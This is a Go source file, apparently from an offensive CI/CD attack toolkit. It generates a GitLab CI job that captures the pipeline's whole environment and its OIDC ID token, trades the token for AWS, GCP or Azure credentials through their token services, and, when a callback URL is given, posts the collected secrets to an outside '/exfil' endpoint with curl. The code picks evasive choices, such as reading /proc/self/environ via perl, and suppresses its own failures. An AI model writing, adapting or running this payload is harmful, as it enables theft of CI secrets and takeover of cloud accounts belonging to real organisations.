package payloads

import (
	"fmt"
	"strings"
)

// OIDCFederationOptions configures an OIDC ID token exfiltration payload.
type OIDCFederationOptions struct {
	Common      CommonOptions
	Provider    string // aws|gcp|azure (default: "aws")
	Audience    string // OIDC audience (default: provider-specific)
	RoleARN     string // AWS role ARN, GCP workload identity pool, or Azure tenant
	CallbackURL string // HTTP callback for exfiltrated cloud credentials
	TokenName   string // id_tokens key name (default: "OIDC_TOKEN")
}

// GenerateOIDCFederationYAML generates a CI job that requests a GitLab OIDC
// token and exchanges it for cloud provider credentials via federation.
func GenerateOIDCFederationYAML(o OIDCFederationOptions) string {
	name, stage := o.Common.defaults("oidc-exfil")
	if o.Provider == "" {
		o.Provider = "aws"
	}
	if o.TokenName == "" {
		o.TokenName = "OIDC_TOKEN"
	}
	if o.Audience == "" {
		o.Audience = defaultAudience(o.Provider)
	}

	script := buildOIDCScript(o)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  id_tokens:
    %s:
      aud: %s
  script:
    - |
%s
  artifacts:
    when: always
    paths:
      - .oidc-federation-result.json
    expire_in: 1 day
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		o.TokenName, o.Audience,
		indentBlock(strings.TrimSpace(script), 6),
		rulesManual(o.Common.Manual))
}

func defaultAudience(provider string) string {
	switch strings.ToLower(provider) {
	case "gcp":
		return "https://iam.googleapis.com"
	case "azure":
		return "api://AzureADTokenExchange"
	default:
		return "sts.amazonaws.com"
	}
}

func buildOIDCScript(o OIDCFederationOptions) string {
	var b strings.Builder

	fmt.Fprintf(&b, `_OIDC_EXFIL() {
  # Capture OIDC token + full environment via perl (less common than printenv)
  perl -e 'open(F,"/proc/self/environ");$/=undef;$_=<F>;s/\0/\n/g;print' \
    > .oidc-federation-result.json 2>/dev/null || \
    env > .oidc-federation-result.json 2>/dev/null || true

  # Record the OIDC token separately if available (GitLab Premium only)
  echo "OIDC_TOKEN_VALUE=$%s" >> .oidc-federation-result.json 2>/dev/null || true

`, o.TokenName)

	switch strings.ToLower(o.Provider) {
	case "gcp":
		buildGCPExchange(&b, o)
	case "azure":
		buildAzureExchange(&b, o)
	default:
		buildAWSExchange(&b, o)
	}

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `
  curl -sS -X POST -F "file=@.oidc-federation-result.json" -F "provider=%s" "%s/exfil" || true
`, o.Provider, o.CallbackURL)
	}

	b.WriteString(`}
_OIDC_EXFIL || true`)

	return b.String()
}

func buildAWSExchange(b *strings.Builder, o OIDCFederationOptions) {
	roleARN := o.RoleARN
	if roleARN == "" {
		roleARN = "arn:aws:iam::ACCOUNT_ID:role/GitLabOIDCRole"
	}
	fmt.Fprintf(b, `  # Exchange OIDC token for AWS credentials via STS
  AWS_CREDS=$(curl -sS -X POST "https://sts.amazonaws.com/" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=%s" \
    --data-urlencode "RoleSessionName=gitlab-oidc-$$" \
    --data-urlencode "WebIdentityToken=$%s" \
    -H "Accept: application/json" 2>/dev/null) || true
  echo "AWS_STS_RESPONSE=$AWS_CREDS" >> .oidc-federation-result.json || true
`, roleARN, o.TokenName)
}

func buildGCPExchange(b *strings.Builder, o OIDCFederationOptions) {
	pool := o.RoleARN
	if pool == "" {
		pool = "projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID"
	}
	fmt.Fprintf(b, `  # Exchange OIDC token for GCP access token via STS
  STS_RESP=$(curl -sS -X POST "https://sts.googleapis.com/v1/token" \
    -H "Content-Type: application/json" \
    -d "{
      \"grant_type\": \"urn:ietf:params:oauth:grant-type:token-exchange\",
      \"audience\": \"//iam.googleapis.com/%s\",
      \"scope\": \"https://www.googleapis.com/auth/cloud-platform\",
      \"requested_token_type\": \"urn:ietf:params:oauth:token-type:access_token\",
      \"subject_token\": \"$%s\",
      \"subject_token_type\": \"urn:ietf:params:oauth:token-type:jwt\"
    }" 2>/dev/null) || true
  echo "GCP_STS_RESPONSE=$STS_RESP" >> .oidc-federation-result.json || true
`, pool, o.TokenName)
}

func buildAzureExchange(b *strings.Builder, o OIDCFederationOptions) {
	tenant := o.RoleARN
	if tenant == "" {
		tenant = "TENANT_ID"
	}
	fmt.Fprintf(b, `  # Exchange OIDC token for Azure AD access token
  AZURE_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/%s/oauth2/v2.0/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_id=APPLICATION_CLIENT_ID" \
    --data-urlencode "client_assertion=$%s" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "scope=https://management.azure.com/.default" 2>/dev/null) || true
  echo "AZURE_AD_RESPONSE=$AZURE_RESP" >> .oidc-federation-result.json || true
`, tenant, o.TokenName)
}
